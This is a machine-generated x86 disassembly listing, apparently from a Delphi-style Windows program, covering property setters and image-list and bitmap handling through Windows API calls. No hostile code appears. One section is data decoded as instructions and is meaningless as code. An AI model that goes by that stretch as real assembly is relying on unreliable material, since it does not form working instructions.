je r-xdata
sub_455e00
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x70 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x70 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_418700
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_418700
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_455e58
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4042c4
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403f0c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418700
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418700
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_455ec0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_455f18
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4042c4
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403f0c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_455f78
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_455fd4
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_456038
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_418700
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032d8
test eax eax
je r-xdata
sub_456098
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4042c4
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_421290
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_455bc8
sub_4560e4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_45610c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_455488
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_455c28
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_456194
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x90 ] eax
sub_4561c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4561f8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a7f0
mov edi eax
mov eax esi
call sub_459178
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_456224
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455a18
mov [ esi + 0x60 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_456260
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_4562a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4562c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4562d0
retn
sub_456304
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
arpl [ ebp ] ax
push esp
arpl [ ebp ] ax
adc [ eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x63 ] ah
inc ebp
add [ edi ] al
jae r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x100457e ] al
add bh bh
push [ esi + edi * 2 + 0x540b0045 ]
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add ecx [ 0x61724454 ]
ja r-xdata
add [ eax ] al
add [ ebx + 0x69070045 ] dh
je r-xdata
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
insd
popad
push es
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
outsb
push ebx
je r-xdata
add [ eax ] al
xchg esp eax
inc ebp
add [ esp + 0x680045 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
push eax
inc ebp
popad
dec ecx
outsb
js r-xdata
inc ebp
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ eax - 0x77ffba8d ] dl
adc [ edx ] eax
push esp
adc [ edx ] al
cwde
adc [ edx ] eax
nop
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ 0x6f840045 ] bl
inc ebp
add [ eax ] ch
inc bp
add [ esp + edi * 2 + 0x7d180045 ] cl
inc ebp
add [ eax + 0x1004575 ] dl
add bh ch
jmp [ eax + 0x10004575 ]
add [ eax ] al
mov al 0x6d
inc ecx
add [ esp + edx + 0x337c0042 ] bh
inc eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x649c0045 ] dl
inc ebp
add [ eax ] ch
popad
jb r-xdata
add [ eax ] al
and bl al
mov eax eax
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0xb400408d
inc ebp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x45 ] dh
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
ror [ ebx - 0x57fe173a ] cl
cld
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 - 0x7217f08c ] 0xcf
cli
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
lodsb [ esi ]
outsb
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
mov eax eax
mov eax 0x3004563
or dl [ ecx + ecx * 2 + 0x6d ]
popad
push esp
jns r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0x63b8c08b
inc ebp
add [ ebx ] al
add ah bh
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebp + 0x74500045 ] bh
inc ebp
add al bl
ja r-xdata
add [ ebx + esi + 0x40 ] bh
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
sub_45651c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420d38
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_456568
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_420d38
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4565bc
push ebx
push esi
push edi
call sub_4034f4
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4187e8
mov edx eax
mov eax edi
call sub_4575f0
mov eax [ edi + 0x50 ]
call sub_403128
mov eax edi
call sub_456918
mov eax [ edi + 0x4c ]
call sub_403128
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420d84
test bl bl
jle r-xdata
call sub_403128
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034dc
sub_456628
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4566d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_457578
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_4566f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4566dc
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_4566f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456795
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_42a64c
mov eax ebx
call sub_4299e0
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424a38
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4170c4
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4299e0
pop edx
call sub_424e6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45679c
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4567b8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_4566f4
pop ecx
pop edx
pop ebx
retn
sub_4567f0
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_4566e0
test al al
je r-xdata
mov eax esi
call sub_456f18
mov eax esi
call sub_4566f4
mov eax esi
mov si 0xffef
call sub_403324
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_456834
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_4566e0
test al al
je r-xdata
mov eax esi
call sub_456f18
mov eax esi
call sub_4566f4
mov eax esi
mov si 0xffef
call sub_403324
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_456878
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456918
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4567b8
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403324
sub_4568c4
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_457500
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_429a4c
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456918
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403324
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_4568b4
push eax
call ImageList_Destroy
sub_456950
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4569e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_4566e0
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4569ea
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov edx eax
mov eax ebx
call sub_456f24
sub_4569f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456a9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_456a82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4566e8
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4568c4
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4568c4
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456a89
mov eax [ ebp - 0x10 ]
call sub_403128
retn
sub_456abc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456bbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4568c4
push eax
mov eax [ ebp - 0x4 ]
call sub_4568b4
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456bc2
mov eax [ ebp - 0xc ]
call sub_403128
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_456b7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_42ab58
mov eax [ ebp - 0x4 ]
call sub_4566e8
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4568a4
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4568c4
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403128
retn
sub_456bd8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebp eax
test esi esi
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax ebp
call sub_4566e0
test al al
je r-xdata
test bl bl
je r-xdata
cmp edi 0xffffffff
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebp + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push edi
push 0x1
mov eax esi
call sub_4299e0
mov edx eax
xor ecx ecx
mov eax ebp
call sub_457158
mov eax ebp
call sub_456c40
cmp edi eax
jl r-xdata
mov bl 0x1
sub_456c40
push ebx
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4568b4
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_456c64
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456e7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4566e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456e82
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403edc
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_457500
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_456abc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
push ebp
push sub_456e2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456e0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_456def
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42a89c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_4299e0
call sub_425280
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4568b4
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_4299e0
call sub_425280
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4568b4
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_4568b4
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456df6
mov eax [ ebp - 0x10 ]
call sub_403128
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
sub_456e8c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456f0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_456c40
cmp esi eax
jl r-xdata
mov eax ebx
call sub_4566e0
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
mov eax ebx
mov si 0xffef
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f12
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
push esi
mov eax ebx
call sub_4568b4
push eax
call ImageList_Remove
sub_456f24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_4564dc
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403324
pop esi
pop ebx
retn
sub_456f5c
push ebx
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_4568b4
push eax
call ImageList_GetBkColor
call sub_4564fc
pop ebx
retn
sub_456f84
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
